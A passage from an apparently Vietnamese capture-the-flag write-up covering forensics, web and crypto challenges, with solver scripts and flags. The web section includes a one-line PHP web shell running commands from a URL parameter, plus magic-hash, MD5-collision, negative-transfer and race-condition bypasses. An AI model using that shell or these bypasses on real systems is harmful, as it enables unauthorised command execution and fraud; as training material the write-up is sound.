    <span class="n">solution</span> <span class="o">=</span> <span class="p">[</span><span class="n">model</span><span class="p">.</span><span class="nf">evaluate</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="nf">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">v</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">solution</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">No solution</span><span class="sh">"</span><span class="p">)</span>
    
<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">solution</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Key: q20OK36QBiWkZT</strong></p>

<p><img src="/images/cookiehanhoan2023/image-12.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{COOk13_4R3n4}</strong></p>

<h2 id="0x04-forensic">0x04 Forensic</h2>

<h3 id="sổ-đăng-ký">Sổ đăng ký</h3>
<p><strong>Description</strong></p>

<p>Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1pShye_YtnUuIObPdnq9PeiIge0Oelsix/view?usp=drive_link">Sổ đăng ký</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Bài toán này, chúng ta nhận được file <code class="language-plaintext highlighter-rouge">NTUSER.DAT</code>. Mở file bằng tool <code class="language-plaintext highlighter-rouge">Registry Finder</code>, tìm những từ khóa như <strong>cmd.exe</strong>, <strong>powershell.exe</strong> để xem có thể khai thác được thông tin gì không.</p>

<p>Chúng ta thu được một đoạn shell code khả nghi.</p>

<p><img src="/images/cookiehanhoan2023/image-13.png" alt="Alt text" /></p>

<p>Nhận thấy có mã hóa base64. Chúng ta đem lên <a href="https://gchq.github.io/CyberChef/">CyberChef</a> để giải mã và thu được flag.</p>

<p><img src="/images/cookiehanhoan2023/image-9.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{N0_4_go_n0_st4r_wh3r3}</strong></p>

<h3 id="tin-học-văn-phòng-cơ-bản">Tin học văn phòng cơ bản</h3>
<p><strong>Description</strong></p>

<p>Sau khi tham gia một khóa Tin học văn phòng cơ bản, Hòa đã có thể tự tạo một tệp tài liệu độc hại và anh ta có ý định sẽ dùng nó để hack cả thế giới</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1WrLFE5qA-qJ6iLEQYQqCo0Xb99Yz8mTH/view?usp=drive_link">Tin học văn phòng cơ bản</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Chúng ta sử dụng tool <code class="language-plaintext highlighter-rouge">olevba</code> để kiểm tra các macro VBA.</p>

<p><img src="/images/cookiehanhoan2023/image-15.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{If_u_w4nt_1_will_aft3rnull_u}</strong></p>

<h2 id="0x05-web">0x05 Web</h2>

<h3 id="magic-login">Magic Login</h3>

<p><strong>Description</strong></p>

<p>Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong <code class="language-plaintext highlighter-rouge">/flag.txt</code> hãy tìm cách đọc được chúng.</p>

<p><strong>Format Flag: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p><img src="/images/cookiehanhoan2023/image-14.png" alt="Alt text" /></p>

<p>Để giải quyết bài toán này, <code class="language-plaintext highlighter-rouge">password</code> sau khi hash sha256 phải bằng 0. Những hash này đều có điểm chung là bắt đầu bằng <strong>0e</strong>.</p>

<p>Lên <a href="https://github.com/spaze/hashes/blob/master/sha256.md">https://github.com/spaze/hashes</a>, chọn một password tùy thích.</p>

<p>Đăng nhập với <strong>password = TyNOQHUS</strong>. Đến đây, chúng ta chỉ cần upload shell đơn giản.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><img src="/images/cookiehanhoan2023/image-16.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_ec3f73ad46f1da5e1f1931a0bb288e0c}</strong></p>

<h3 id="magic-login-harder">Magic Login Harder</h3>

<p><strong>Description</strong></p>

<p>Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong <code class="language-plaintext highlighter-rouge">/flagXXX.txt</code> hãy tìm cách đọc được chúng.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
cp /flag.txt /flag$FLAG.txt
</code></pre></div></div>
<p>Tải challenge: <a href="https://drive.google.com/file/d/1ZSmsdcJ3iFR2KH4aSBQ9z4xlY-z8o-UH">Magic Login Harder</a> (pass: cookiehanhoan)</p>

<p><strong>Format Flag: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"submit"</span><span class="p">])){</span>
        <span class="nv">$username</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]);</span>

        <span class="k">if</span><span class="p">((</span><span class="nv">$username</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)){</span>
            <span class="k">echo</span> <span class="s1">'Username and password are not the same'</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span><span class="o">===</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">))){</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: admin.php?file=1.txt'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'Username and password are wrong'</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Để giải quyết bài toán này, chúng ta phải đi tìm 2 chuỗi <strong>username</strong> và <strong>password</strong> khác nhau nhưng đều có cùng giá trị MD5. Hướng khai thác <strong>MD5 Collision</strong></p>

<p>Chỉ cần lên Google, search một chút về vấn đề này, chúng ta có được kết quả khá ưng ý.</p>

<ul>
  <li><a href="https://stackoverflow.com/questions/1756004/can-two-different-strings-generate-the-same-md5-hash-code">Can two different strings generate the same MD5 hash code?</a></li>
  <li><a href="https://www.mscs.dal.ca/~selinger/md5collision">MD5 Collision Demo</a></li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="n">x</span> <span class="o">=</span> <span class="sh">'</span><span class="s">4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2</span><span class="sh">'</span>
<span class="n">y</span> <span class="o">=</span> <span class="sh">'</span><span class="s">4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2</span><span class="sh">'</span>

<span class="n">x</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">y</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="n">y</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">md5</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">md5</span><span class="p">(</span><span class="n">y</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">())</span>

<span class="n">x</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">y</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="c1"># x = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og==
# y = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og==
</span></code></pre></div></div>

<p>Login thành công với cặp <strong>(x, y)</strong> thu được ở trên. Sau đó chuyển qua trang <code class="language-plaintext highlighter-rouge">admin.php</code> để xử lý tiếp bài toán.</p>

<h3 id="be-positive">Be Positive</h3>

<p><strong>Description</strong></p>

<p>Libra Dnuf Marketplace</p>

<p>Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob.</p>

<p>After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal.</p>

<p>To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state.</p>

<p><strong>Solution</strong></p>

<p>Từ tên bài toán và là bài web dễ nhất trong đề. Khả năng cao bài toán sẽ có lỗ hổng chuyển tiền âm.</p>

<p>Vào tab <code class="language-plaintext highlighter-rouge">Transfer</code>, chỉnh sửa giá trị <code class="language-plaintext highlighter-rouge">min = -99999</code> rồi chuyển tiền cho Bob với số tiền là <code class="language-plaintext highlighter-rouge">-2000</code>.</p>

<p><img src="/images/cookiehanhoan2023/image-17.png" alt="Alt text" /></p>

<p>Bây giờ, chúng ta đã có dư tiền để mua flag.</p>

<p><img src="/images/cookiehanhoan2023/image-18.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_a2c3d35c666e930911bfb0777e1e93ae}</strong></p>

<h3 id="slow-down">Slow Down</h3>

<p><strong>Description</strong></p>

<p>Libra Dnuf Marketplace</p>

<p>Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob.</p>

<p>After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal.</p>

<p>To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state.</p>

<p><strong>Solution</strong></p>

<p>Ở bài toán này, cấu trúc tương tự như bài <code class="language-plaintext highlighter-rouge">Be Positive</code> nhưng đã bị filter số âm.</p>

<p>Nhận thấy, phản hồi chuyển tiền thành công về khá lâu, cộng thêm tên bài toán là <code class="language-plaintext highlighter-rouge">Slow Down</code>. Từ đấy, mình nghĩ hướng xử lý bài toán liên quan tới <strong>Race Condition</strong>.</p>

<p>Sử dụng 2 trình duyệt khác nhau, cùng login với tài khoản Alice và chuyển tiền đến Bob.</p>

<p><img src="/images/cookiehanhoan2023/image-19.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{ea5y_RaCe_CONd17iOn_e84d1b098a499d032afe243ab64dd49a}</strong></p>

<h2 id="0x06-crypto">0x06 Crypto</h2>

<h3 id="basic-operator">Basic Operator</h3>

<p><strong>Description</strong></p>

<p>Sử dụng kiến thức toán học và cấu trúc đại số để giải mã flag</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/12t2NfEJISC_TSI0FFjqiHDEQmlGEH195">Basic Operator</a> (pass: cookiehanhoan)</p>

<p><strong>Solution</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.Util</span> <span class="kn">import</span> <span class="n">number</span>

<span class="k">def</span> <span class="nf">padding_pkcs7</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">block_size</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
	<span class="n">tmp</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="n">block_size</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="nf">bytes</span><span class="p">([</span><span class="n">block_size</span><span class="o">-</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">%</span><span class="n">block_size</span><span class="p">)]))</span>

<span class="k">def</span> <span class="nf">split_block</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">block_size</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="nf">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">block_size</span><span class="p">],</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="n">block_size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">plus_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">shift</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">+</span><span class="n">shift</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">mul_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">mul</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">*</span><span class="n">mul</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">xor_shift_right_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">bit_loc</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">^</span><span class="p">(</span><span class="n">data</span><span class="o">&gt;&gt;</span><span class="n">bit_loc</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">pow_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">pow</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exp_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">base</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">pow</span><span class="p">(</span><span class="n">base</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="nf">pow_func</span><span class="p">(</span><span class="nf">exp_func</span><span class="p">(</span><span class="nf">xor_shift_right_func</span><span class="p">(</span><span class="nf">mul_func</span><span class="p">(</span><span class="nf">plus_func</span><span class="p">(</span><span class="n">block</span><span class="p">,</span><span class="mi">3442055609</span><span class="p">),</span><span class="mi">2898124289</span><span class="p">),</span><span class="mi">1</span><span class="p">),</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">),</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="nf">split_block</span><span class="p">(</span><span class="nf">padding_pkcs7</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="mi">4</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
	<span class="n">p</span> <span class="o">=</span> <span class="mi">1341161101353773850779</span>
	<span class="n">e</span> <span class="o">=</span> <span class="mi">2</span>
	<span class="n">mess</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">CHH{CENSORED}</span><span class="sh">'</span>
	<span class="n">cipher_flag</span> <span class="o">=</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">mess</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="n">cipher_flag</span><span class="p">)</span>
</code></pre></div></div>

<p>Nhận thấy bài toán mã hóa từng block 4 byte một. Vì vậy, chúng ta hoàn toàn có thể brute-force các kí tự để đoán từng block một. 
Để giải quyết bài toán này, chúng ta có hai cách để giải:</p>
<ul>
  <li>Brute-force từng block một như đã phân tích ở trên</li>
  <li>Dựng ngược lại các hàm đã cho để đi tìm flag</li>
</ul>

<p><strong>Cách giải 1.</strong></p>

<p>Nhận thấy rằng <code class="language-plaintext highlighter-rouge">Cipher</code> có 12 block, với 4 chữ cái đầu tiên của flag sẽ là <strong>“CHH{“</strong>. Quan sát kết quả mã hóa block đầu tiên này và so sánh với <code class="language-plaintext highlighter-rouge">Cipher</code>, ta khẳng định được:</p>
<ul>
  <li>Block đầu tiên của flag là <strong>“CHH{“</strong></li>
  <li>Block cuối cùng của flag có 1, 2 hoặc 3 kí tự. Vậy các trường hợp có thể xảy ra là:
    <ul>
      <li>b’}\x03\x03\x03’</li>
      <li>b’x}\x02\x02’</li>
      <li>b’xx}\x01’</li>
    </ul>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">printable</span>

<span class="k">def</span> <span class="nf">padding_pkcs7</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">block_size</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
	<span class="n">tmp</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="n">block_size</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="nf">bytes</span><span class="p">([</span><span class="n">block_size</span><span class="o">-</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">%</span><span class="n">block_size</span><span class="p">)]))</span>

<span class="k">def</span> <span class="nf">split_block</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">block_size</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="nf">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">block_size</span><span class="p">],</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="n">block_size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">plus_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">shift</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">+</span><span class="n">shift</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">mul_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">mul</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">*</span><span class="n">mul</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">xor_shift_right_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">bit_loc</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">^</span><span class="p">(</span><span class="n">data</span><span class="o">&gt;&gt;</span><span class="n">bit_loc</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">pow_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">pow</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exp_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">base</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">pow</span><span class="p">(</span><span class="n">base</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="nf">pow_func</span><span class="p">(</span><span class="nf">exp_func</span><span class="p">(</span><span class="nf">xor_shift_right_func</span><span class="p">(</span><span class="nf">mul_func</span><span class="p">(</span><span class="nf">plus_func</span><span class="p">(</span><span class="n">block</span><span class="p">,</span><span class="mi">3442055609</span><span class="p">),</span><span class="mi">2898124289</span><span class="p">),</span><span class="mi">1</span><span class="p">),</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">),</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="nf">split_block</span><span class="p">(</span><span class="nf">padding_pkcs7</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="mi">4</span><span class="p">))</span>

<span class="n">p</span> <span class="o">=</span> <span class="mi">1341161101353773850779</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">Cipher</span> <span class="o">=</span> <span class="p">[</span><span class="mi">752589857254588976778</span><span class="p">,</span> <span class="mi">854606763225554935934</span><span class="p">,</span> <span class="mi">102518422244000685572</span><span class="p">,</span> <span class="mi">779286449062901931327</span><span class="p">,</span> <span class="mi">424602910997772742508</span><span class="p">,</span> <span class="mi">1194307203769437983433</span><span class="p">,</span> <span class="mi">501056821915021871618</span><span class="p">,</span> <span class="mi">691835640758326884371</span><span class="p">,</span> <span class="mi">778501969928317687301</span><span class="p">,</span> <span class="mi">1260460302610253211574</span><span class="p">,</span> <span class="mi">833211399330573153864</span><span class="p">,</span> <span class="mi">223847974292916916557</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">index</span> <span class="o">!=</span> <span class="mi">11</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">tqdm</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">))):</span>
            <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">tqdm</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">))):</span>
                <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">)):</span>
                    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">)):</span>
                        <span class="n">flag</span> <span class="o">=</span> <span class="p">(</span><span class="n">printable</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="n">printable</span><span class="p">[</span><span class="n">y</span><span class="p">]</span> <span class="o">+</span> <span class="n">printable</span><span class="p">[</span><span class="n">z</span><span class="p">]</span> <span class="o">+</span> <span class="n">printable</span><span class="p">[</span><span class="n">t</span><span class="p">]).</span><span class="nf">encode</span><span class="p">()</span> 
                        <span class="k">if</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">flag</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">Cipher</span><span class="p">[</span><span class="n">index</span><span class="p">]:</span> 
                            <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
                            <span class="nf">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span> 
        <span class="c1"># b'}\x03\x03\x03'
</span>        <span class="c1"># b'x}\x02\x02'
</span>        <span class="c1"># b'xx}\x01'
</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">tqdm</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">))):</span>
            <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">)):</span>
                <span class="n">flag</span> <span class="o">=</span> <span class="p">(</span><span class="n">printable</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="n">printable</span><span class="p">[</span><span class="n">y</span><span class="p">]</span> <span class="o">+</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
                <span class="k">if</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">flag</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">Cipher</span><span class="p">[</span><span class="n">index</span><span class="p">]:</span> 
                    <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
                    <span class="nf">exit</span><span class="p">()</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="p">(</span><span class="n">printable</span><span class="p">[</span><span class="n">y</span><span class="p">]</span> <span class="o">+</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
            <span class="k">if</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">flag</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">Cipher</span><span class="p">[</span><span class="n">index</span><span class="p">]:</span> 
                <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
                <span class="nf">exit</span><span class="p">()</span>
            
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span>
        <span class="nf">brute</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>

